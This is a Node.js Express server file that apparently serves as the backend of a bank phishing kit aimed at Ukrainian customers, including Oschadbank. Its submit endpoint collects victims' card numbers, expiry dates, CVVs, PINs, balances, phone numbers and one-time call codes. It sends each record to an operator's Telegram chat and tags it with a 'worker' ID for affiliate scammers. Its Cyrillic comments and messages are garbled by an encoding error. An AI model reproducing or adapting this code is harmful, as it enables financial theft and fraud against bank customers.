const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram
const BOT_TOKEN = '–¢–í–û–ô_–¢–û–ö–ï–ù_–ë–û–¢–ê';
const CHAT_ID = '–¢–í–û–ô_CHAT_ID';
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// –°–µ—Å—Å–∏–∏
const sessions = new Map();

// –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
function sendToTelegram(message, sessionId, bankName) {
    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
        .then(() => console.log(`‚úÖ –õ–æ–≥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è —Å–µ—Å—Å–∏–∏ ${sessionId}`))
        .catch(err => console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', err));
}

// API –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, ...stepData } = req.body;

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };

    // üëà —Å–æ—Ö—Ä–∞–Ω—è–µ–º –≤–æ—Ä–∫–µ—Ä–∞ –∏–∑ —Å—Å—ã–ª–∫–∏
    if (req.query.worker) {
        newData.worker = req.query.worker;
    }

    sessions.set(sessionId, newData);

    // –ï—Å–ª–∏ –ø—Ä–∏—à—ë–ª –∫–æ–¥ –∑–≤–æ–Ω–∫–∞
    if (newData.call_code_input) {
        let message = `<b>üîî –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥ —ñ–∑ –¥–∑–≤—ñ–Ω–∫–∞ (–û—â–∞–¥–±–∞–Ω–∫)!</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;

        // üëà –¥–æ–±–∞–≤–ª—è–µ–º –≤–æ—Ä–∫–µ—Ä–∞
        if (newData.worker) {
            message += `<b>üë§ Worker:</b> ${newData.worker}\n`;
        }

        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    // –§–∏–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>–ù–æ–≤–∏–π –∑–∞–ø–∏—Å!</b>\n\n`;
        message += `<b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card_confirm || newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if (newData['card-expiry']) message += `<b>–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>–ü—ñ–Ω:</b> <code>${newData.pin || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if (newData.balance) message += `<b>–ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>${newData.balance}</code>\n`;
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} —Ä–∞–∑`;
        message += `<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n`;

        // üëà –¥–æ–±–∞–≤–ª—è–µ–º –≤–æ—Ä–∫–µ—Ä–∞
        if (newData.worker) {
            message += `<b>üë§ Worker:</b> ${newData.worker}\n`;
        }

        sendToTelegram(message, sessionId, newData.bankName);
    }

    res.status(200).json({ message: 'OK' });
});

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏
app.get('/api/new-session', (req, res) => {
    const sessionId = uuidv4();
    sessions.set(sessionId, { visitCount: 0 });
    res.json({ sessionId });
});

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
app.listen(PORT, () => {
    console.log(`üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ http://localhost:${PORT}`);
});
